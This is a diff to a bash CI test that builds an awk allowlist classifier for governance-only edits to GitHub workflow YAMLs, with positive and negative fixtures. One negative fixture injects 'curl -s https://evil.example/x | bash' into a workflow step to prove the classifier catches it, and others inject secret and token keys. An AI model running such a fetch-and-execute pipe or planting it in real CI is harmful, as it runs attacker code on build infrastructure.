@@ -1,6 +1,9 @@
 #!/usr/bin/env bash
 # SPDX-FileCopyrightText: 2026 Munsik-Park
 # SPDX-License-Identifier: Elastic-2.0
+# ci-subject: .claude/hooks/check-autoflow-gate.sh .github/workflows/host-purity-delta.yml CLAUDE.md plugin/autoflow/hooks/check-autoflow-gate.sh scripts/test/check-host-purity-delta.sh tests/fixtures/host-purity-paths.txt tests/fixtures/host-purity-tokens.txt
+# lane: standing
+# budget-secs: SUITE_BUDGET_CEILING_SECS
 # =============================================================================
 # Test: diff-scoped host-purity DELTA guard — Issue #788
 # =============================================================================
@@ -454,12 +457,283 @@ else
   assert_eq "AC10a: check-autoflow-gate.sh untouched vs origin/main, OR changed with its plugin/autoflow/hooks mirror byte-identical (#843 parity-carried drift protection)" \
     "yes" "$hook_change_admitted"
 
-  # #985 AC3-SPDX-COVERAGE: every tracked .yml gains a 2-line inline SPDX
-  # header. This admits an SPDX-header-only diff on the two CI runner YAMLs
-  # (added lines matching only the SPDX header patterns, no deletions and no
-  # other additions) — mirroring AC10a's #843 parity-carry exception. Any
-  # other change to these files stays caught.
-  wf_diff="$(git -C "$PROJECT_ROOT" diff "$base_ref"..HEAD -- \
+  # unrecognized_added_lines_in_diff <diff-text>
+  # Prints one line per ADDED ('+') line the admission predicate below does
+  # NOT recognize. Classifies every added line against the union of:
+  #   - blank / comment-only lines
+  #   - the two #985 AC3-SPDX-COVERAGE header lines
+  #   - #103's governance-only shape: a whole new "- id: select" step's
+  #     body, admitted line-by-line against the EXACT shipped capture-then-
+  #     check shape (cycle 2, ledger O15/O14, test round 3 option (i)) --
+  #     NOT a blanket "anything deeper than the opener" admission. The
+  #     cycle-1 form of this classifier admitted any line inside that block,
+  #     which a negative arm below proves was a real hole (an injected curl
+  #     line was silently admitted); "- name: reconcile selection against
+  #     step outcomes" keeps the cycle-1 blanket block-scope admission
+  #     unchanged -- untouched by cycle 2, out of this fix's scope --
+  #     plus the three single-line guard-shape insertions into an EXISTING
+  #     suite step ("id: s-<name>", "if: contains(format(...", "if:
+  #     always()", "timeout-minutes: <N>"), plus an appended paths: glob
+  #     list item -- ONLY inside a "paths:" block's own YAML scope (GATE:
+  #     QUALITY quality-deduction finding: an earlier form admitted any
+  #     `- '...'` line file-wide, broader than the stated paths-append
+  #     scope of feature design §2.2) -- plus a "fetch-depth: 0" line, ONLY
+  #     inside a checkout step's OWN "with:" block (cycle 2:
+  #     fetch-depth-full-history, schema-hook-contract.yml), never file-wide.
+  # Block scope (the reconcile-step opener block, the select-step body, the
+  # checkout with: block, and the paths: block) is tracked over BOTH added
+  # and context lines (not only '+' lines), because the existing markers a
+  # governance insertion nests under ("- name: Run ...", "paths:", "uses:
+  # actions/checkout@...") are themselves context lines in a purely
+  # additive diff and must still close/open a prior block.
+  unrecognized_added_lines_in_diff() {
+    printf '%s\n' "$1" | grep -vE '^(diff --git|index |--- |\+\+\+ |@@ )' | awk '
+      function indent_of(s,   i,n,c) {
+        n = 0
+        for (i = 1; i <= length(s); i++) {
+          c = substr(s, i, 1)
+          if (c == " ") n++; else break
+        }
+        return n
+      }
+      # is_select_body_line(c) -- the EXACT capture-then-check shape shipped
+      # in schema-hook-contract.yml (and identically in every other selector-
+      # consuming workflow), one clause per line. No wildcard/regex over the
+      # body: a recognized-shape allowlist, not "anything in the block", is
+      # the whole point of the cycle-2 tightening.
+      function is_select_body_line(c) {
+        if (c == "name: select suites for this change") return 1
+        if (c == "run: |") return 1
+        if (c == "rc=0") return 1
+        if (c == "bash scripts/test/select-suites.sh --event \"$GITHUB_EVENT_NAME\" \\") return 1
+        if (c == "> \"$RUNNER_TEMP/selected-raw.txt\" \\") return 1
+        if (c == "2> \"$RUNNER_TEMP/selection-report.txt\" || rc=$?") return 1
+        if (c == "cat \"$RUNNER_TEMP/selection-report.txt\"") return 1
+        if (c == "if [ \"$rc\" -ne 0 ]; then") return 1
+        if (c == "echo \"select-suites exited $rc — refusing to run with an unresolved selection\" >&2") return 1
+        if (c == "exit \"$rc\"") return 1
+        if (c == "fi") return 1
+        if (c == "paste -sd" Q " " Q " - < \"$RUNNER_TEMP/selected-raw.txt\" > \"$RUNNER_TEMP/selected.txt\"") return 1
+        if (c == "printf " Q "suites=%s\\n" Q " \"$(cat \"$RUNNER_TEMP/selected.txt\")\" >> \"$GITHUB_OUTPUT\"") return 1
+        return 0
+      }
+      BEGIN { Q = sprintf("%c", 39) }
+      {
+        marker = substr($0, 1, 1)
+        rest = substr($0, 2)
+        ind = indent_of(rest)
+        content = rest
+        sub(/^[ \t]*/, "", content)
+
+        select_opener = (content == "- id: select")
+        reconcile_opener = (content == "- name: reconcile selection against step outcomes")
+        opener = select_opener || reconcile_opener
+        other_step_marker = (content ~ /^- (id|name):/) && !opener
+
+        # Reconcile step -- cycle-1 blanket block-scope admission, unchanged.
+        if (reconcile_opener) { deep_block = 1; deep_indent = ind }
+        else if (other_step_marker) { deep_block = 0 }
+        else if (deep_block && ind <= deep_indent) { deep_block = 0 }
+
+        # Select step -- block scope TRACKS membership only; admission below
+        # is per-line against is_select_body_line(), never blanket.
+        if (select_opener) { sel_block = 1; sel_indent = ind }
+        else if (other_step_marker) { sel_block = 0 }
+        else if (sel_block && ind <= sel_indent) { sel_block = 0 }
+
+        # Checkout step'"'"'s own with: block -- a "uses: actions/checkout@..."
+        # line opens candidacy at its own indent; the immediately-following
+        # "with:" line at that SAME indent (a step-body sibling key, not a
+        # nested one) opens the with: scope, which closes the same way the
+        # paths: block does below. Never file-wide: a fetch-depth: 0 line
+        # belonging to some other checkout step, or sitting outside any
+        # with: block, does not credit this arm.
+        checkout_with_opener = 0
+        if (content ~ /^uses: actions\/checkout@/) { checkout_uses_indent = ind; saw_checkout_uses = 1 }
+        else if (saw_checkout_uses && content == "with:" && ind == checkout_uses_indent) { checkout_with = 1; checkout_with_indent = ind; saw_checkout_uses = 0; checkout_with_opener = 1 }
+        else if (checkout_with && ind <= checkout_with_indent) { checkout_with = 0 }
+        else if (other_step_marker) { saw_checkout_uses = 0 }
+
+        # paths: block scope, tracked the same way -- a "paths:" key line
+        # opens it at its own indent; any subsequent line (context or
+        # added) closes it once the indent returns to <= the opening indent,
+        # UNLESS that line is itself a fresh "paths:" opener.
+        if (content == "paths:") { in_paths = 1; paths_indent = ind }
+        else if (in_paths && ind <= paths_indent) { in_paths = 0 }
+
+        if (marker != "+") next
+
+        if (content == "") next
+        if (content ~ /^#[[:space:]]*SPDX-FileCopyrightText:/) next
+        if (content ~ /^#[[:space:]]*SPDX-License[-]Identifier:/) next
+        if (content ~ /^#/) next
+        if (reconcile_opener) next
+        if (deep_block && ind > deep_indent) next
+        if (select_opener) next
+        if (sel_block && ind > sel_indent && is_select_body_line(content)) next
+        if (content ~ /^id: s-[A-Za-z0-9_-]+$/) next
+        if (content ~ /^if: contains\(format\(/) next
+        if (content ~ /^if: always\(\)$/) next
+        if (content ~ /^timeout-minutes: [0-9]+$/) next
+        if (in_paths && ind > paths_indent && content ~ /^- \x27[^\x27]*\x27$/) next
+        if (checkout_with_opener) next
+        if (checkout_with && ind > checkout_with_indent && content == "fetch-depth: 0") next
+        print $0
+      }
+    '
+  }
+
+  # Negative arm (falsifiability): the classifier above must still flag a
+  # non-governance edit — a bogus added line that is none of blank, comment,
+  # SPDX header, an admitted step block, or a guard-shape single-line
+  # insertion. Run BEFORE using the classifier for real, so a vacuously
+  # permissive predicate is caught here rather than silently passing AC10b.
+  # (the trailing context line intentionally names no real suite path — a
+  # literal "bash tests/<name>.sh" string spanning this fixture would itself
+  # match check-suite-leaf.sh's command-position shape, since that lint reads
+  # line by line and this fixture's quoting is not the same-line quoted-string
+  # form its "ignored" row covers)
+  NEGATIVE_ARM_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,2 +1,3 @@
+       - name: Run schema↔hook contract test
++        env:
++          UNRELATED_SECRET: injected'
+  NEGATIVE_ARM_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$NEGATIVE_ARM_DIFF" | grep -c .)"
+  assert_true "AC10b negative arm: a non-governance addition (an unrelated 'env:' key) is NOT admitted by the governance-only classifier (got $NEGATIVE_ARM_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$NEGATIVE_ARM_UNRECOGNIZED\" -gt 0 ]"
+
+  # ---------------------------------------------------------------------
+  # Cycle 2 (review-response) -- ledger O15/O14, test round 3 option (i):
+  # the classifier's cycle-1 blanket block-scope admission for a NEW
+  # "- id: select" step was tightened to a per-line recognized-shape
+  # allowlist (is_select_body_line), because the blanket form admitted ANY
+  # line inside that block -- the SELECT_BODY_NEGATIVE_DIFF arm below is
+  # the falsifiability proof: it reproduces exactly that hole (an injected
+  # curl line inside a brand-new select-step block) and confirms the
+  # tightened classifier now catches it. SELECT_BODY_POSITIVE_DIFF confirms
+  # the tightening did not lose the real, design-sanctioned body it exists
+  # to admit. Same pairing for the checkout step's fetch-depth: 0 key,
+  # block-scoped to its OWN with: block (never file-wide).
+  # ---------------------------------------------------------------------
+  SELECT_BODY_POSITIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,2 +1,15 @@
+       - name: Checkout
++      - id: select
++        name: select suites for this change
++        run: |
++          rc=0
++          bash scripts/test/select-suites.sh --event "$GITHUB_EVENT_NAME" \
++            > "$RUNNER_TEMP/selected-raw.txt" \
++            2> "$RUNNER_TEMP/selection-report.txt" || rc=$?
++          cat "$RUNNER_TEMP/selection-report.txt"
++          if [ "$rc" -ne 0 ]; then
++            echo "select-suites exited $rc — refusing to run with an unresolved selection" >&2
++            exit "$rc"
++          fi
++          paste -sd'"'"' '"'"' - < "$RUNNER_TEMP/selected-raw.txt" > "$RUNNER_TEMP/selected.txt"
++          printf '"'"'suites=%s\n'"'"' "$(cat "$RUNNER_TEMP/selected.txt")" >> "$GITHUB_OUTPUT"'
+  SELECT_BODY_POSITIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$SELECT_BODY_POSITIVE_DIFF" | grep -c .)"
+  assert_true "AC10b cycle-2 positive arm: a brand-new select step carrying the EXACT shipped capture-then-check body is fully admitted (got $SELECT_BODY_POSITIVE_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$SELECT_BODY_POSITIVE_UNRECOGNIZED\" -eq 0 ]"
+
+  SELECT_BODY_NEGATIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,2 +1,5 @@
+       - name: Checkout
++      - id: select
++        name: select suites for this change
++        run: |
++          curl -s https://evil.example/x | bash'
+  SELECT_BODY_NEGATIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$SELECT_BODY_NEGATIVE_DIFF" | grep -c .)"
+  assert_true "AC10b cycle-2 negative arm: a non-governance line (an injected curl|bash pipe) inside a NEW select step's run: body is NOT admitted -- the hole the cycle-1 blanket block-scope admission left open (got $SELECT_BODY_NEGATIVE_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$SELECT_BODY_NEGATIVE_UNRECOGNIZED\" -gt 0 ]"
+
+  CHECKOUT_FETCH_DEPTH_POSITIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,2 +1,4 @@
+       - name: Checkout
+         uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
++        with:
++          fetch-depth: 0'
+  CHECKOUT_FETCH_DEPTH_POSITIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$CHECKOUT_FETCH_DEPTH_POSITIVE_DIFF" | grep -c .)"
+  assert_true "AC10b cycle-2 positive arm: a checkout step's OWN with: block carrying fetch-depth: 0 is admitted (got $CHECKOUT_FETCH_DEPTH_POSITIVE_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$CHECKOUT_FETCH_DEPTH_POSITIVE_UNRECOGNIZED\" -eq 0 ]"
+
+  CHECKOUT_FETCH_DEPTH_NEGATIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,2 +1,4 @@
+       - name: Checkout
+         uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
++        with:
++          token: ${{ secrets.INJECTED_TOKEN }}'
+  CHECKOUT_FETCH_DEPTH_NEGATIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$CHECKOUT_FETCH_DEPTH_NEGATIVE_DIFF" | grep -c .)"
+  assert_true "AC10b cycle-2 negative arm: a non-governance checkout key (an injected with: token:) is NOT admitted -- the with: opener alone is admitted, its content is checked (got $CHECKOUT_FETCH_DEPTH_NEGATIVE_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$CHECKOUT_FETCH_DEPTH_NEGATIVE_UNRECOGNIZED\" -gt 0 ]"
+
+  # GATE:QUALITY quality-deduction finding: the classifier's paths: glob-item
+  # admission (`^- '...'$`) must be scoped to a paths: block's own YAML
+  # context, not admitted file-wide. Negative arm: the same quoted-string
+  # shape appears as a list item OUTSIDE any paths: block (a `steps:` list
+  # entry, not a trigger glob) and must stay unrecognized.
+  PATHS_SCOPE_NEGATIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,2 +1,3 @@
+     steps:
++      - '"'"'not-a-paths-glob-injected-here'"'"''
+  PATHS_SCOPE_NEGATIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$PATHS_SCOPE_NEGATIVE_DIFF" | grep -c .)"
+  assert_true "AC10b classifier breadth negative arm: a quoted-string list item OUTSIDE any paths: block (under steps:, not a trigger glob) is NOT admitted (got $PATHS_SCOPE_NEGATIVE_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$PATHS_SCOPE_NEGATIVE_UNRECOGNIZED\" -gt 0 ]"
+
+  # Positive counterpart: the SAME quoted-string list-item shape, appended
+  # INSIDE a paths: block, IS admitted -- confirms the tightened classifier
+  # did not lose the legitimate append it exists to allow.
+  PATHS_SCOPE_POSITIVE_DIFF='diff --git a/.github/workflows/fixture.yml b/.github/workflows/fixture.yml
+index 0000000..1111111 100644
+--- a/.github/workflows/fixture.yml
++++ b/.github/workflows/fixture.yml
+@@ -1,3 +1,4 @@
+     paths:
+      - '"'"'tests/existing-glob.sh'"'"'
++      - '"'"'tests/newly-appended-glob.sh'"'"''
+  PATHS_SCOPE_POSITIVE_UNRECOGNIZED="$(unrecognized_added_lines_in_diff "$PATHS_SCOPE_POSITIVE_DIFF" | grep -c .)"
+  assert_true "AC10b classifier breadth positive arm: a quoted-string list item appended INSIDE a paths: block is still admitted (got $PATHS_SCOPE_POSITIVE_UNRECOGNIZED unrecognized line(s))" \
+    "[ \"$PATHS_SCOPE_POSITIVE_UNRECOGNIZED\" -eq 0 ]"
+
+  # #985 AC3-SPDX-COVERAGE (every tracked .yml gains a 2-line inline SPDX
+  # header) and #103's governance-only edit (select step / per-suite id+if+
+  # timeout-minutes guard / reconciliation step, on suite steps only — see
+  # .autoflow/issue-103-gate-plan.md F2 and
+  # scripts/test/suite-manifest.sh:315) are both admitted on the two CI
+  # runner YAMLs, by the same no-deletions / all-added-lines-recognized
+  # shape as AC10a's #843 parity-carry exception. Any other change to these
+  # files stays caught.
+  # --unified=100000: the block-scope tracker in
+  # unrecognized_added_lines_in_diff() (paths:, the checkout step's with:,
+  # the select step's body) opens each block off an OPENER LINE it must see
+  # in the diff STREAM, context or added. Git's default 3-line context can
+  # leave that opener out of the hunk entirely when the insertion sits far
+  # from it (e.g. a new paths: glob appended after many pre-existing
+  # entries) -- the block never opens and a legitimately-shaped addition
+  # reads as unrecognized. Full-file context makes every opener visible
+  # regardless of list length; it changes nothing the classifier admits,
+  # only whether the lines it already knows how to admit are present to
+  # check (cycle-3 fact: AC10b reds on schema-hook-contract.yml's paths:
+  # append at b1513c0 without this).
+  wf_diff="$(git -C "$PROJECT_ROOT" diff --unified=100000 "$base_ref"..HEAD -- \
     .github/workflows/workflow-regression.yml .github/workflows/schema-hook-contract.yml 2>/dev/null)"
   wf_untouched="no"; [[ -z "$wf_diff" ]] && wf_untouched="yes"
   wf_change_admitted="no"
@@ -467,14 +741,12 @@ else
     wf_change_admitted="yes"
   else
     wf_deleted_lines="$(printf '%s\n' "$wf_diff" | grep -c '^-[^-]')"
-    wf_added_other="$(printf '%s\n' "$wf_diff" | grep '^+[^+]' \
-      | grep -vE '^\+# SPDX-FileCopyrightText:|^\+# SPDX-License-Identifier:' \
-      | wc -l | tr -d ' ')"
+    wf_added_other="$(unrecognized_added_lines_in_diff "$wf_diff" | grep -c . || true)"
     if [[ "$wf_deleted_lines" -eq 0 && "$wf_added_other" -eq 0 ]]; then
       wf_change_admitted="yes"
     fi
   fi
-  assert_eq "AC10b: existing CI runner YAMLs untouched vs origin/main, OR changed with an SPDX-header-only diff (#985 AC3-SPDX-COVERAGE inline header)" \
+  assert_eq "AC10b: existing CI runner YAMLs untouched vs origin/main, OR changed with an SPDX-header-only diff (#985 AC3-SPDX-COVERAGE) and/or a governance-only diff (#103 select/guard-shape/reconciliation on suite steps)" \
     "yes" "$wf_change_admitted"
 fi
 
